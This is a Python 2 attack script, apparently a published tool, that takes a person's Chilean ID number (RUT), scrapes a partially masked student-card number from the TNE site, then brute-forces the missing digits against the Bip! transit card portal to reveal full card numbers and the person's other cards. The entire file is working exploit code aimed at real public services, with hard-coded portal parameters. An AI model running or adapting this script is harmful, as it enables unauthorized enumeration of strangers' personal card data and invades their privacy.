#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#
# @s1kr10s

import urllib2
from time import time
import os
import sys
import re
import argparse

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])
cls()

RED = '\x1b[91m'
RED1 = '\033[91m'
GREEN = '\033[32m'
BLUE = '\033[94m'
BOLD = '\033[1m'
ENDC = '\033[0m'
logo = RED1 + '''
  ▄▄▄█████▓ ███▄    █ ▓█████  ▄▄▄▄    ██▓ ██▓███  
  ▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀ ▓█████▄ ▓██▒▓██░  ██▒
  ▒ ▓██░ ▒░▓██  ▀█ ██▒▒███   ▒██▒ ▄██▒██▒▓██░ ██▓▒
  ░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄ ▒██░█▀  ░██░▒██▄█▓▒ ▒
    ▒██▒ ░ ▒██░   ▓██░░▒████▒░▓█  ▀█▓░██░▒██▒ ░  ░
    ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░░▒▓███▀▒░▓  ▒▓▒░ ░  ░
      ░    ░ ░░   ░ ▒░ ░ ░  ░▒░▒   ░  ▒ ░░▒ ░     
    ░         ░   ░ ░    ░    ░    ░  ▒ ░░░       
                    ░    ░  ░ ░       ░           
                                   ░   By @s1kr10s                                        
''' + ENDC
print logo

ap = argparse.ArgumentParser()
ap.add_argument("-r", "--rut", required=True,
                help='Rut Ej: -r ( 11111111-1 o 11.111.111-1)')
args = vars(ap.parse_args())


print BLUE + "\n  [+]Iniciando GET de TNE..." + ENDC
start_time = time()

rutt = args["rut"].split('-')[0].replace('.', '')
dvt = args["rut"].split('-')[1]

urln ='http://pocae.tstgo.cl/PortalCAE-WAR-MODULE/SesionPortalServlet'
urlnt ="http://sistema.tne.cl/tie/estados_tarjetas/tneEmitidas/"+str(rutt)+"/"+str(dvt)+""
responset = urllib2.urlopen(urlnt)
code = responset.read()

strfin = "parent.document.frm_tne.tne_folio_tne.value"
exps = re.compile(ur'\S\*\b\d{1,6}')
status = 0

rut = rutt+'-'+dvt
if code.find(strfin) != -1:
	seminum = re.findall(exps, code)
	if len(seminum) > 0:
		tar = seminum[0].split('*')[2]
		status = 1
		proceso = time() - start_time
		print BLUE + "  [-]Informacion Extraida en" + ENDC + " %.4f Seg." % proceso

if status == 1:
	start_time1 = time()
	print BLUE + "  [+]Iniciando BRUTE FORCE BIP..." + ENDC
	for i in range(100):
		proceso1 = time() - start_time1
		if i < 10:
			try:
				datan='accion=10&NumTarjeta=0'+str(i)+str(tar)
				response = urllib2.urlopen(urln, datan)
				text = response.read()
				if text.find("<tipo>1</tipo>") != -1:
					datap2 = 'accion=11&NumTarjeta='+str(i)+str(tar)+'&RutUsuario='+str(rut)+'&NumDistribuidor=99&NomUsuario=usuInternet&NomHost=AFT&NomDominio=aft.cl&Trx='
					response2 = urllib2.urlopen(urln, datap2)
					text2 = response2.read()
					if text2.find("<bloq>0</bloq>") != -1:
						if len(seminum) > 1:
							semi = list(set(seminum))
							index = semi.index('**'+tar)
							semi.pop(index)
							sem = semi.pop(0)
						else:
							sem = "No hay Otras"
							
						print BLUE + "  [-]Mostrando Informacion en" + ENDC + " %.4f Seg." % proceso1
						print BLUE + "\n  ==========INFORMACION==========" + ENDC
						print GREEN+"\n  RUT       : "+str(rut)+" \n  TARJETA   : "+str(i)+str(tar)+" \n  OTRAS TAR : "+str(sem)
						for otras in semi:
							print "\t      " + otras
						print ENDC + BLUE + "\n  ===============================\n" + ENDC
			except Exception, e:
				pass
		else:
			try:
				datan='accion=10&NumTarjeta='+str(i)+str(tar)
				response = urllib2.urlopen(urln, datan)
				text = response.read()
				if text.find("<tipo>1</tipo>") != -1:
					datap2 = 'accion=11&NumTarjeta='+str(i)+str(tar)+'&RutUsuario='+str(rut)+'&NumDistribuidor=99&NomUsuario=usuInternet&NomHost=AFT&NomDominio=aft.cl&Trx='
					response2 = urllib2.urlopen(urln, datap2)
					text2 = response2.read()
					if text2.find("<bloq>0</bloq>") != -1:
						if len(seminum) > 1:
							semi = list(set(seminum))
							index = semi.index('**'+tar)
							semi.pop(index)
							sem = semi.pop(0)
						else:
							sem = "No hay Otras"

						print BLUE + "  [-]Mostrando Informacion en" + ENDC + " %.4f Seg." % proceso1
						print BLUE + "\n  ==========INFORMACION==========" + ENDC
						print GREEN+"\n  RUT       : "+str(rut)+" \n  TARJETA   : "+str(i)+str(tar)+" \n  OTRAS TAR : "+str(sem)
						
						for otras in semi:
							print "\t      " + otras
						print ENDC + BLUE + "\n  ===============================\n" + ENDC
			except Exception, e:
				pass
else:
	print RED + "\n  * Rut " + str(rut) + " no tiene tarjeta asignada.\n" + ENDC
